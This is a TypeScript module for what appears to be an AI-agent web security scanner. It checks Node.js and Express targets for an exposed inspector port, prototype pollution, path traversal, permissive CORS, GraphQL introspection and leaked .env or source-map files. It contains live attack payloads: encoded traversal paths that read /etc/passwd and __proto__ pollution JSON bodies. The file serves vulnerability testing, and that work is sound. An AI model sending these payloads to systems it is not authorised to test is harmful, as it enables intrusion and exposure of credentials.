// nodejs stack checks — 1:1 port of infra-security-mcp `providers/nodejs` (node_*).
// Every URL path, payload, header and detection branch matches the source exactly;
// only the transport (scope-guarded webhook sender) and the Check/severity adapter
// are CyberStrike's. Multi-finding tools fold into one Check via `verdict`.
import z from "zod"
import { defineWebhookTool } from "../define"
import type { HttpSender } from "../transport"
import { get, header, failed, ok, base, host, summarize, verdict, type Check, type Finding } from "./shared"

export namespace Node {
  export async function detect(sender: HttpSender, origin: string): Promise<Check> {
    const main = await get(sender, origin)
    if (failed(main)) return { check: "detect", hit: false, severity: "info", detail: "no response" }
    const findings: string[] = []

    const poweredBy = header(main, "x-powered-by")
    if (poweredBy === "Express") findings.push("X-Powered-By: Express")
    else if (poweredBy.toLowerCase().includes("next")) findings.push(`X-Powered-By: ${poweredBy} (Next.js)`)
    else if (poweredBy) findings.push(`X-Powered-By: ${poweredBy}`)

    const etag = header(main, "etag")
    if (etag.startsWith('W/"') && etag.includes("-")) findings.push("Express-style weak ETag detected")

    const bogus = await get(sender, `${origin}/${crypto.randomUUID().slice(0, 8)}`)
    if (ok(bogus)) {
      if (bogus.body.includes("Cannot GET") || bogus.body.includes("Cannot POST")) findings.push("Express default 404: 'Cannot GET /...'")
      if (bogus.body.includes("Not Found") && bogus.body.includes("Error") && bogus.body.length < 200) findings.push("Minimal JSON error response — Node.js framework pattern")
    }

    const jsonError = await get(sender, `${origin}/${crypto.randomUUID().slice(0, 8)}`, { Accept: "application/json" })
    if (ok(jsonError)) {
      try {
        const parsed = JSON.parse(jsonError.body) as { message?: unknown; error?: unknown; statusCode?: unknown }
        if (parsed.message || parsed.error || parsed.statusCode) findings.push("JSON error response with message/error/statusCode structure")
      } catch {
        /* not JSON */
      }
    }

    if (main.body.includes("__NEXT_DATA__")) findings.push("Next.js application detected (__NEXT_DATA__ present)")
    if (main.body.includes("_nuxt/")) findings.push("Nuxt.js application detected")

    if (findings.length === 0) return { check: "detect", hit: false, severity: "info", detail: "Node.js framework not detected" }
    return { check: "detect", hit: true, severity: "info", detail: findings.join("; "), evidence: findings[0] }
  }

  export async function debugPort(sender: HttpSender, origin: string): Promise<Check> {
    const findings: Finding[] = []
    const jsonList = await get(sender, `http://${host(origin)}:9229/json/list`)
    if (ok(jsonList) && jsonList.status === 200 && jsonList.body.includes("webSocketDebuggerUrl")) {
      findings.push({ severity: "critical", detail: `Node.js inspector at ${host(origin)}:9229 — full RCE via WebSocket DevTools Protocol`, evidence: jsonList.body.slice(0, 200) })
      try {
        const sessions = JSON.parse(jsonList.body) as Array<{ title?: string; url?: string }>
        if (Array.isArray(sessions)) findings.push({ severity: "critical", detail: `${sessions.length} debug session(s) active: ${sessions.map((s) => s.title || s.url).join(", ")}` })
      } catch {
        /* parse fail */
      }
    }

    const jsonVersion = await get(sender, `http://${host(origin)}:9229/json/version`)
    if (ok(jsonVersion) && jsonVersion.status === 200 && jsonVersion.body.includes("V8")) {
      try {
        const ver = JSON.parse(jsonVersion.body) as Record<string, string>
        findings.push({ severity: "high", detail: `Node ${ver["Node.js"] ?? "?"}, V8 ${ver["V8"] ?? "?"}` })
      } catch {
        /* parse fail */
      }
    }

    return verdict("debug_port", findings, "Node inspector port (:9229) not exposed (in-scope)")
  }

  export async function prototypePollution(sender: HttpSender, origin: string): Promise<Check> {
    const baseline = await sender.send({ method: "POST", url: origin, headers: { "Content-Type": "application/json" }, body: JSON.stringify({ test: "baseline" }) })
    if (failed(baseline)) return { check: "prototype_pollution", hit: false, severity: "info", detail: "no JSON POST endpoint" }

    const payloads: { name: string; raw: string }[] = [
      { name: "__proto__.polluted", raw: '{"__proto__":{"polluted":"true"}}' },
      { name: "__proto__.constructor", raw: '{"__proto__":{"constructor":{"prototype":{"polluted":"true"}}}}' },
      { name: "constructor.prototype", raw: '{"constructor":{"prototype":{"polluted":"true"}}}' },
    ]

    const findings: Finding[] = []
    for (const p of payloads) {
      const res = await sender.send({ method: "POST", url: origin, headers: { "Content-Type": "application/json" }, body: p.raw })
      if (failed(res)) continue
      if (res.status === 500 && baseline.status !== 500) findings.push({ severity: "high", detail: `${p.name}: Server error triggered — prototype chain may have been modified`, evidence: `baseline=${baseline.status} payload=${res.status}` })
      if (res.body.includes("polluted") && !baseline.body.includes("polluted")) findings.push({ severity: "high", detail: `${p.name}: Injected property 'polluted' reflected in response — prototype pollution confirmed`, evidence: res.body.slice(0, 150) })
      if (res.body.includes("TypeError") || res.body.includes("Cannot read prop")) findings.push({ severity: "high", detail: `${p.name}: TypeError in response — object prototype chain disrupted` })
    }

    return verdict("prototype_pollution", findings, "no prototype-pollution signal")
  }

  export async function pathTraversal(sender: HttpSender, origin: string): Promise<Check> {
    const traversals = [
      { path: "/..%2f..%2f..%2f..%2fetc/passwd", name: "url_encoded_traversal" },
      { path: "/..\\..\\..\\..\\etc/passwd", name: "backslash_traversal" },
      { path: "/static/..%2f..%2f..%2f..%2fetc/passwd", name: "static_prefix_traversal" },
      { path: "/public/..%2f..%2f..%2f..%2fetc/passwd", name: "public_prefix_traversal" },
      { path: "/assets/..%2f..%2f..%2f..%2fetc/passwd", name: "assets_prefix_traversal" },
      { path: "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", name: "double_encoded_dots" },
      { path: "/..%252f..%252f..%252fetc/passwd", name: "double_url_encoded" },
      { path: "/..%c0%af..%c0%afetc/passwd", name: "overlong_utf8" },
    ]

    const findings: Finding[] = []
    for (const t of traversals) {
      const res = await get(sender, `${origin}${t.path}`)
      if (ok(res) && res.body.includes("root:") && res.body.includes("/bin/")) findings.push({ severity: "critical", detail: `${t.name} (${t.path}): File /etc/passwd contents returned — path traversal confirmed`, evidence: res.body.slice(0, 200) })
    }

    const pkg = await get(sender, `${origin}/package.json`)
    if (ok(pkg) && pkg.status === 200 && (pkg.body.includes('"dependencies"') || pkg.body.includes('"name"'))) findings.push({ severity: "medium", detail: "/package.json: package.json exposed via static serving — reveals dependencies and project structure" })

    return verdict("path_traversal", findings, "no static traversal / package.json exposure")
  }

  export async function expressMisconfig(sender: HttpSender, origin: string): Promise<Check> {
    const findings: Finding[] = []

    const main = await get(sender, origin)
    if (ok(main) && header(main, "x-powered-by") === "Express") findings.push({ severity: "low", detail: "X-Powered-By: Express not disabled — reveals framework for targeted attacks" })

    const bogus = await get(sender, `${origin}/${crypto.randomUUID().slice(0, 8)}`)
    if (ok(bogus) && (bogus.body.includes("at Function.") || bogus.body.includes("at Layer.") || bogus.body.includes("at Router."))) findings.push({ severity: "medium", detail: "Express stack traces exposed in error responses — leaks internal paths and middleware" })

    const cors = await get(sender, origin, { Origin: "https://evil.example.com" })
    if (ok(cors)) {
      const acao = header(cors, "access-control-allow-origin")
      const acac = header(cors, "access-control-allow-credentials")
      if (acao === "*") findings.push({ severity: "medium", detail: "CORS Access-Control-Allow-Origin: * — allows any origin to read responses" })
      else if (acao === "https://evil.example.com") findings.push({ severity: "high", detail: `CORS reflects arbitrary Origin${acac === "true" ? " WITH credentials" : ""} — credential theft possible` })
    }

    const gqlPaths = ["/graphql", "/graphiql", "/playground", "/altair", "/voyager"]
    for (const p of gqlPaths) {
      const res = await get(sender, `${origin}${p}`)
      if (ok(res) && res.status === 200 && (res.body.includes("GraphiQL") || res.body.includes("graphql-playground") || res.body.includes("altair"))) {
        findings.push({ severity: "medium", detail: `GraphQL IDE exposed at ${p} — allows arbitrary query execution and schema introspection` })
        break
      }
    }

    const introspect = await sender.send({ method: "POST", url: `${origin}/graphql`, headers: { "Content-Type": "application/json" }, body: JSON.stringify({ query: "{ __schema { types { name } } }" }) })
    if (ok(introspect) && introspect.status === 200 && introspect.body.includes("__schema")) findings.push({ severity: "medium", detail: "GraphQL introspection enabled — full schema enumeration possible" })

    return verdict("express_misconfig", findings, "no CORS-with-creds or open introspection")
  }

  export async function envLeak(sender: HttpSender, origin: string): Promise<Check> {
    const findings: Finding[] = []

    const envPaths = ["/.env", "/.env.local", "/.env.production", "/.env.development", "/.env.staging"]
    for (const p of envPaths) {
      const res = await get(sender, `${origin}${p}`)
      if (ok(res) && res.status === 200 && res.body.length > 5 && (res.body.includes("=") || res.body.includes("DATABASE") || res.body.includes("API_KEY") || res.body.includes("SECRET"))) findings.push({ severity: "critical", detail: `${p}: Environment file exposed — likely contains secrets, API keys, database credentials` })
    }

    const pkgJson = await get(sender, `${origin}/package.json`)
    if (ok(pkgJson) && pkgJson.status === 200 && (pkgJson.body.includes('"dependencies"') || pkgJson.body.includes('"scripts"'))) findings.push({ severity: "low", detail: "/package.json: exposed — reveals dependencies, scripts, and project metadata" })

    const pkgLock = await get(sender, `${origin}/package-lock.json`)
    if (ok(pkgLock) && pkgLock.status === 200 && pkgLock.body.includes('"lockfileVersion"')) findings.push({ severity: "low", detail: "/package-lock.json: exposed — reveals exact dependency versions for targeting known CVEs" })

    const nodeModules = await get(sender, `${origin}/node_modules/`)
    if (ok(nodeModules) && nodeModules.status === 200 && (nodeModules.body.includes("Index of") || nodeModules.body.includes("Directory listing"))) findings.push({ severity: "medium", detail: "/node_modules/: directory listing — reveals all installed packages" })

    const mapPaths = ["/main.js.map", "/app.js.map", "/bundle.js.map", "/vendor.js.map"]
    for (const p of mapPaths) {
      const res = await get(sender, `${origin}${p}`)
      if (ok(res) && res.status === 200 && (res.body.includes('"sources"') || res.body.includes('"mappings"'))) {
        findings.push({ severity: "medium", detail: `${p}: Source map file exposed — original source code recoverable` })
        break
      }
    }

    return verdict("env_leak", findings, "no .env / package / source-map exposure")
  }

  const RUNNERS: Record<string, (s: HttpSender, o: string) => Promise<Check>> = {
    detect,
    debug_port: debugPort,
    prototype_pollution: prototypePollution,
    path_traversal: pathTraversal,
    express_misconfig: expressMisconfig,
    env_leak: envLeak,
  }

  export async function run(sender: HttpSender, origin: string, which: string): Promise<Check[]> {
    const names = which === "all" ? Object.keys(RUNNERS) : [which]
    const out: Check[] = []
    for (const n of names) out.push(await RUNNERS[n](sender, origin))
    return out
  }
}

const DESCRIPTION = `Node.js / Express / Koa / Fastify / Next / Nuxt checks (detection via X-Powered-By/weak-ETag/Cannot-GET/JSON-error/__NEXT_DATA__/_nuxt, inspector :9229 RCE port, prototype pollution via __proto__/constructor.prototype JSON payloads, Express static path traversal + package.json, X-Powered-By/stack-traces/CORS-wildcard+reflection/GraphQL-IDE+introspection, .env/package/node_modules/source-map leak). 1:1 port of the infra-security nodejs provider.

Run after Vortex fingerprints Node/Express. Inspector probe (:9229) respects the scope guard. check="all" (default) runs every check.`

export const NodeTestTool = defineWebhookTool({
  name: "node_test",
  description: DESCRIPTION,
  parameters: z.object({
    target: z.string().describe("Target origin or URL (e.g. https://target.com)."),
    check: z
      .enum(["all", "detect", "debug_port", "prototype_pollution", "path_traversal", "express_misconfig", "env_leak"])
      .default("all")
      .describe("Which check to run; 'all' runs every Node check."),
  }),
  async run(params, ctx) {
    const origin = base(params.target)
    const results = await Node.run(ctx.sender, origin, params.check)
    return { target: origin, results }
  },
  format(r) {
    return summarize("node_test", r.target, r.results)
  },
})
